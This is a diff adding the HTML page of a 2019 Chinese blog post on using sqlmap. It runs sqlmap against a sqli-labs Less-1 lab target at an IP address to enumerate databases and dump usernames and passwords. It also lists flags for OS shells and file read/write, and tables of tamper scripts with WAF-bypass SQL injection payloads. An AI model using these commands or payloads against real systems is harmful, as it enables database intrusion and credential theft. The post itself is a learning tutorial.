@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>SQLMap使用 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="SQLMap,工具使用,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SQLMap使用</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-04-08
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h3 id="SQLMap入门"><a href="#SQLMap入门" class="headerlink" title="SQLMap入门"></a>SQLMap入门</h3><p>这里以sql–labs Less-1为例，介绍sqlmap的基本使用方法</p>
+<h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p>结果如下所示</p>
+<p><img src="/article/936c561b/Entertainment\STU\Bolg\source\_posts\SQLMap使用\1.png" alt></p>
+<p>可以看到检测到了系统、数据库、php的信息，上面还有注入点信息以及相应的payload</p>
+<h4 id="判断文本种的请求是否存在注入"><a href="#判断文本种的请求是否存在注入" class="headerlink" title="判断文本种的请求是否存在注入"></a>判断文本种的请求是否存在注入</h4><p>SQLMap可以加载文件中的HTTP请求，这样就不用手动设置其他参数，</p>
+<h4 id="查询数据库中的信息"><a href="#查询数据库中的信息" class="headerlink" title="查询数据库中的信息"></a>查询数据库中的信息</h4><p>查询所有数据库<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --dbs</code></p>
+<p>获取数据库中的表名<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security --tables</code></p>
+<p>获取表中的字段名<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users --columns</code></p>
+<p>获取字段的内容<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users -C username,password --dump</code></p>
+<p>获取数据库用户的密码<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --passwords</code></p>
+<p>获取当前网站数据库的名称 <code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --current-db</code></p>
+<p>获取当前网站的用户名称<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --current-user</code></p>
+<h3 id="SQLMap进阶"><a href="#SQLMap进阶" class="headerlink" title="SQLMap进阶"></a>SQLMap进阶</h3><table>
+<thead>
+<tr>
+<th>功能</th>
+<th style="text-align:center">参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>探测等级</td>
+<td style="text-align:center">–level    （一共有五个等级）</td>
+</tr>
+<tr>
+<td>当前用户是否为管理员权限</td>
+<td style="text-align:center">–is-dba</td>
+</tr>
+<tr>
+<td>列出数据库管理员角色</td>
+<td style="text-align:center">–roles</td>
+</tr>
+<tr>
+<td>HTTP Referer头</td>
+<td style="text-align:center">–referer</td>
+</tr>
+<tr>
+<td>运行自定义SQL语句</td>
+<td style="text-align:center">–sql-shell</td>
+</tr>
+<tr>
+<td>运行任意操作系统命令</td>
+<td style="text-align:center">–os-cmd,–os-shell</td>
+</tr>
+<tr>
+<td>从数据库服务器中读取文件</td>
+<td style="text-align:center">–file-read</td>
+</tr>
+<tr>
+<td>上传文件到数据库服务器中</td>
+<td style="text-align:center">–file-write –file-dest</td>
+</tr>
+</tbody>
+</table>
+<h3 id="SQLMap自带绕过脚本"><a href="#SQLMap自带绕过脚本" class="headerlink" title="SQLＭap自带绕过脚本"></a>SQLＭap自带绕过脚本</h3><h4 id="支持所有数据库的脚本"><a href="#支持所有数据库的脚本" class="headerlink" title="支持所有数据库的脚本"></a>支持所有数据库的脚本</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>apostrophemask.py</td>
+<td>用utf8代替引号</td>
+<td>(“1 AND ‘1’=’1”)  ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>用base64编码替换</td>
+<td>(“1’ AND SLEEP(5)#”)<br>‘MScgQU5EIFNMRUVQKDUpIw==’</td>
+</tr>
+<tr>
+<td>multiplespaces.py</td>
+<td>围绕SQL关键字添加多个空格</td>
+<td>(‘1 UNION SELECT foobar’)<br>‘1    UNION     SELECT   foobar’</td>
+</tr>
+<tr>
+<td>space2plus.py</td>
+<td>用+替换空格</td>
+<td>(‘SELECT id FROM users’)<br>‘SELECT+id+FROM+users’</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement.py</td>
+<td>双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如  .replace（“SELECT”、””)） filters</td>
+<td>(‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’</td>
+</tr>
+<tr>
+<td>space2randomblank.py</td>
+<td>代替空格字符（“”）从一个随机的空 白字符可选字符的有效集</td>
+<td>(‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’</td>
+</tr>
+<tr>
+<td>unionalltounion.py</td>
+<td>替换UNION ALL SELECT UNION SELECT</td>
+<td>(‘-1 UNION ALL SELECT’)<br> ‘-1 UNION SELECT’</td>
+</tr>
+<tr>
+<td>securesphere.py</td>
+<td>追加特制的字符串</td>
+<td>(‘1 AND 1=1’) <br>“1 AND 1=1 and ‘0having’=’0having’”</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>space2hash.py</td>
+<td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
+<td>‘1 AND 9227=9227’<br>  ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td>
+</tr>
+<tr>
+<td>equaltolike.py</td>
+<td>like 代替等号</td>
+<td><em> Input: SELECT </em> FROM users WHERE id=1  2 <em> Output: SELECT </em> FROM users WHERE id LIKE 1</td>
+</tr>
+<tr>
+<td>space2mssqlblank.py(mssql)</td>
+<td>空格替换为其它空符号</td>
+<td>Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>替换空格</td>
+<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE </em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>sp_password.py</td>
+<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
+<td>(‘1 AND 9227=9227– ‘) ‘1 AND 9227=9227– sp_password’</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT <br></em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>用‘/**/’ 替换空格</td>
+<td><em> Input: SELECT id FROM users<br> </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="mysql-gt-5-1-13"><a href="#mysql-gt-5-1-13" class="headerlink" title="mysql &gt;= 5.1.13"></a>mysql &gt;= 5.1.13</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>equaltolike.py</td>
+<td>like 代替等号</td>
+<td><em> Input: SELECT </em> FROM users WHERE id=1  <br> <em> Output: SELECT </em> FROM users WHERE id LIKE 1</td>
+</tr>
+<tr>
+<td>greatest.py</td>
+<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
+<td>(‘1 AND A &gt; B’) <br>‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  <br>‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull.py</td>
+<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
+<td>(‘IFNULL(1, 2)’) <br>‘IF(ISNULL(1),2,1)’</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>替换空格</td>
+<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
+</tr>
+<tr>
+<td>modsecurityversioned.py</td>
+<td>过滤空格，包含完整的查询版本注释</td>
+<td>(‘1 AND 2&gt;1–’)<br> ‘1 /<em>!30874AND 2&gt;1</em>/–’</td>
+</tr>
+<tr>
+<td>space2mysqlblank.py</td>
+<td>空格替换其它空白符号(mysql)</td>
+<td>Input: SELECT id FROM users <br>Output: SELECT%0Bid%0BFROM%A0users</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) <br>‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned.py</td>
+<td>包含了完整的查询与零版本注释</td>
+<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!00000AND 2&gt;1</em>/–’</td>
+</tr>
+<tr>
+<td>space2mysqldash.py</td>
+<td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
+<td>(‘1 AND 9227=9227’)<br> ‘1–%0AAND–%0A9227=9227’</td>
+</tr>
+<tr>
+<td>bluecoat.py</td>
+<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
+<td>(‘SELECT id FROM users where id = 1’) <br>‘SELECT%09id FROM users where id LIKE 1’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE <br></em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT <br></em> Output: InsERt</td>
+</tr>
+<tr>
+<td>versionedkeywords.py</td>
+<td>用版本化的MySQL注释将每个非函数关键字括起来</td>
+<td><code>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>用‘/**/’ 替代空格</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>注释绕过</td>
+<td><em> `Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# </em> Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#`</td>
+</tr>
+</tbody>
+</table>
+<h4 id="MySQL-lt-5-1"><a href="#MySQL-lt-5-1" class="headerlink" title="MySQL &lt; 5.1"></a>MySQL &lt; 5.1</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>关键字前加注释</td>
+<td><em> Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa </em> Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论</td>
+<td><code>1.(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;) `</code>2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”`</td>
+</tr>
+</tbody>
+</table>
+<h4 id="MySQL-gt-5-1-13"><a href="#MySQL-gt-5-1-13" class="headerlink" title="MySQL &gt;= 5.1.13"></a>MySQL &gt;= 5.1.13</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>space2morehash.py</td>
+<td>空格替换为 #号 以及更多随机字符串 换行符</td>
+<td><em> Input: 1 AND 9227=9227 </em> Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>greatest.py</td>
+<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
+<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE </em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT </em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th style="text-align:left">作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>greatest.py</td>
+<td style="text-align:left">绕过过滤’&gt;’ ,用GREATEST替换大于号</td>
+<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td style="text-align:left">绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td style="text-align:left">用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td style="text-align:left">asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE </em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td style="text-align:left">url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE </em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td style="text-align:left">随机大小写</td>
+<td><em> Input: INSERT </em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td style="text-align:left">字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td style="text-align:left">Replaces space character (‘ ‘) with comments ‘/**/’</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>appendnullbyte.py</td>
+<td>在有效负荷结束位置加载零字节字符编码</td>
+<td>(‘1 AND 1=1’) ‘1 AND 1=1%00’</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>chardoubleencode.py</td>
+<td>双url编码(不处理以编码的)</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
+<td></td>
+</tr>
+<tr>
+<td>unmagicquotes.py</td>
+<td>宽字符绕过 GPC  addslashes</td>
+<td><em> Input: 1′ AND 1=1 <br></em> Output: 1%bf%27 AND 1=1–%20</td>
+<td><em> Input: 1′ AND 1=1 </em> Output: 1%bf%27 AND 1=1–%20</td>
+</tr>
+<tr>
+<td>randomcomments.py</td>
+<td>用/**/分割sql关键字</td>
+<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
+<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><a href="https://blog.csdn.net/whatday/article/details/54774043" target="_blank" rel="noopener">sqlmap –tamper 绕过WAF脚本分类整理</a></p>
+<p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357" target="_blank" rel="noopener">sqlmap的使用 —- 自带绕过脚本tamper</a></p>
+</blockquote>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/936c561b.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/SQLMap/">
+              #SQLMap
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/工具使用/">
+              #工具使用
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/3160b465.html" target="_self">渗透环境搭建</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/bbe59b8.html" target="_self">计算机网络-数据链路层</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
